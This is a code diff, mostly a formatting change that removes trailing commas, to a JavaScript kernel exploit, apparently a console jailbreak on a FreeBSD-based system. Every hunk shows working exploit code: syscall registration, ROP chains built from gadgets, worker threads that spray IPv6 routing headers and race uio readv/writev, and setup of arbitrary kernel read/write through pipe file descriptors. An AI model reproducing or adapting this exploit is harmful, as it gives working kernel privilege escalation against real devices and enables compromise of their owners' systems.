@@ -34,19 +34,19 @@ fn.register(
   0x87,
   "socketpair",
   ["number", "number", "number", "bigint"],
-  "bigint",
+  "bigint"
 );
 fn.register(
   0x76,
   "getsockopt",
   ["bigint", "number", "number", "bigint", "bigint"],
-  "bigint",
+  "bigint"
 );
 fn.register(
   0x69,
   "setsockopt",
   ["bigint", "number", "number", "bigint", "number"],
-  "bigint",
+  "bigint"
 );
 fn.register(0x17, "setuid", ["number"], "bigint");
 fn.register(20, "getpid", [], "bigint");
@@ -55,20 +55,20 @@ fn.register(
   0x1e7,
   "cpuset_getaffinity",
   ["number", "number", "bigint", "number", "bigint"],
-  "bigint",
+  "bigint"
 );
 fn.register(
   0x1e8,
   "cpuset_setaffinity",
   ["number", "number", "bigint", "number", "bigint"],
-  "bigint",
+  "bigint"
 );
 fn.register(0x1d2, "rtprio_thread", ["number", "number", "bigint"], "bigint");
 fn.register(
   0x63,
   "netcontrol",
   ["bigint", "number", "bigint", "number"],
-  "bigint",
+  "bigint"
 );
 fn.register(0x1c7, "thr_new", ["bigint", "number"], "bigint");
 fn.register(0x1b1, "thr_kill", ["bigint", "number"], "bigint");
@@ -357,7 +357,7 @@ function iov_recvmsg_worker_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0x10),
     gadgets.POP_R8_RET,
     cpu,
-    cpuset_setaffinity_wrapper,
+    cpuset_setaffinity_wrapper
   );
   var rbuf = malloc(4);
   write16(rbuf, 2);
@@ -369,14 +369,14 @@ function iov_recvmsg_worker_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0),
     gadgets.POP_RDX_RET,
     rbuf,
-    rtprio_thread_wrapper,
+    rtprio_thread_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
     ready,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   var loop_start = rop.length;
   rop.push(
@@ -386,7 +386,7 @@ function iov_recvmsg_worker_rop(ready, run_fd, done, signal_buf) {
     signal_buf,
     gadgets.POP_RDX_RET,
     new BigInt(1),
-    read_wrapper,
+    read_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
@@ -395,14 +395,14 @@ function iov_recvmsg_worker_rop(ready, run_fd, done, signal_buf) {
     msg,
     gadgets.POP_RDX_RET,
     new BigInt(0),
-    recvmsg_wrapper,
+    recvmsg_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
     done,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   return { rop, loop_size: rop.length - loop_start };
 }
@@ -422,7 +422,7 @@ function uio_readv_worker_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0x10),
     gadgets.POP_R8_RET,
     cpu,
-    cpuset_setaffinity_wrapper,
+    cpuset_setaffinity_wrapper
   );
   var rbuf = malloc(4);
   write16(rbuf, 2);
@@ -434,14 +434,14 @@ function uio_readv_worker_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0),
     gadgets.POP_RDX_RET,
     rbuf,
-    rtprio_thread_wrapper,
+    rtprio_thread_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
     ready,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   var loop_start = rop.length;
   rop.push(
@@ -451,7 +451,7 @@ function uio_readv_worker_rop(ready, run_fd, done, signal_buf) {
     signal_buf,
     gadgets.POP_RDX_RET,
     new BigInt(1),
-    read_wrapper,
+    read_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
@@ -460,14 +460,14 @@ function uio_readv_worker_rop(ready, run_fd, done, signal_buf) {
     uioIovWrite,
     gadgets.POP_RDX_RET,
     new BigInt(UIO_IOV_NUM),
-    readv_wrapper,
+    readv_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
     done,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   return { rop, loop_size: rop.length - loop_start };
 }
@@ -487,7 +487,7 @@ function uio_writev_worker_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0x10),
     gadgets.POP_R8_RET,
     cpu,
-    cpuset_setaffinity_wrapper,
+    cpuset_setaffinity_wrapper
   );
   var rbuf = malloc(4);
   write16(rbuf, 2);
@@ -499,14 +499,14 @@ function uio_writev_worker_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0),
     gadgets.POP_RDX_RET,
     rbuf,
-    rtprio_thread_wrapper,
+    rtprio_thread_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
     ready,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   var loop_start = rop.length;
   rop.push(
@@ -516,7 +516,7 @@ function uio_writev_worker_rop(ready, run_fd, done, signal_buf) {
     signal_buf,
     gadgets.POP_RDX_RET,
     new BigInt(1),
-    read_wrapper,
+    read_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
@@ -525,14 +525,14 @@ function uio_writev_worker_rop(ready, run_fd, done, signal_buf) {
     uioIovRead,
     gadgets.POP_RDX_RET,
     new BigInt(UIO_IOV_NUM),
-    writev_wrapper,
+    writev_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
     done,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   return { rop, loop_size: rop.length - loop_start };
 }
@@ -552,7 +552,7 @@ function ipv6_spray_and_read_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0x10),
     gadgets.POP_R8_RET,
     cpu,
-    cpuset_setaffinity_wrapper,
+    cpuset_setaffinity_wrapper
   );
   var rbuf = malloc(4);
   write16(rbuf, 2);
@@ -564,14 +564,14 @@ function ipv6_spray_and_read_rop(ready, run_fd, done, signal_buf) {
     new BigInt(0),
     gadgets.POP_RDX_RET,
     rbuf,
-    rtprio_thread_wrapper,
+    rtprio_thread_wrapper
   );
   rop.push(
     gadgets.POP_RDI_RET,
     ready,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   var loop_start = rop.length;
   rop.push(
@@ -581,7 +581,7 @@ function ipv6_spray_and_read_rop(ready, run_fd, done, signal_buf) {
     signal_buf,
     gadgets.POP_RDX_RET,
     new BigInt(1),
-    read_wrapper,
+    read_wrapper
   );
   for (var i = 0; i < ipv6_socks.length; i++) {
     rop.push(
@@ -595,7 +595,7 @@ function ipv6_spray_and_read_rop(ready, run_fd, done, signal_buf) {
       spray_rthdr_rop.add(i * UCRED_SIZE),
       gadgets.POP_R8_RET,
       new BigInt(spray_rthdr_len),
-      setsockopt_wrapper,
+      setsockopt_wrapper
     );
   }
   for (var i = 0; i < ipv6_socks.length; i++) {
@@ -610,7 +610,7 @@ function ipv6_spray_and_read_rop(ready, run_fd, done, signal_buf) {
       read_rthdr_rop.add(i * 8),
       gadgets.POP_R8_RET,
       check_len,
-      getsockopt_wrapper,
+      getsockopt_wrapper
     );
   }
   rop.push(
@@ -618,7 +618,7 @@ function ipv6_spray_and_read_rop(ready, run_fd, done, signal_buf) {
     done,
     gadgets.POP_RAX_RET,
     new BigInt(1),
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET,
+    gadgets.MOV_QWORD_PTR_RDI_RAX_RET
   );
   rop.push(gadgets.POP_RDI_RET, new BigInt(0), thr_exit_wrapper);
   return { rop, loop_size: 0 };
@@ -735,7 +735,7 @@ function wait_uio_writev() {
 function trigger_ipv6_spray_and_read() {
   write64(spray_ipv6_worker.done, 0);
   spray_ipv6_worker.thread_id = Number(
-    spawn_thread(spray_ipv6_worker.rop, 0, spray_ipv6_stack).and(0xffffffff),
+    spawn_thread(spray_ipv6_worker.rop, 0, spray_ipv6_stack).and(0xffffffff)
   );
   write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
 }
@@ -837,7 +837,7 @@ function setup() {
       " uio_r " +
       UIO_THREAD_NUM +
       " uio_w " +
-      UIO_THREAD_NUM,
+      UIO_THREAD_NUM
   );
 }
 
@@ -868,7 +868,7 @@ function cleanup(killWorkers) {
     write(
       new BigInt(spray_ipv6_worker.pipe_1),
       spray_ipv6_worker.signal_buf,
-      1,
+      1
     );
     if (killWorkers && spray_ipv6_worker.thread_id)
       thr_kill(spray_ipv6_worker.thread_id, 9);
@@ -1237,10 +1237,10 @@ function setup_arbitrary_rw() {
   var fd_files = kreadslow64(kq_fdp);
   fdt_ofiles = fd_files.add(0);
   var master_file = kreadslow64(
-    fdt_ofiles.add(masterRpipeFd * FILEDESCENT_SIZE),
+    fdt_ofiles.add(masterRpipeFd * FILEDESCENT_SIZE)
   );
   var victim_file = kreadslow64(
-    fdt_ofiles.add(victimRpipeFd * FILEDESCENT_SIZE),
+    fdt_ofiles.add(victimRpipeFd * FILEDESCENT_SIZE)
   );
   master_r_pipe_data = kreadslow64(master_file.add(0));
   victim_r_pipe_data = kreadslow64(victim_file.add(0));
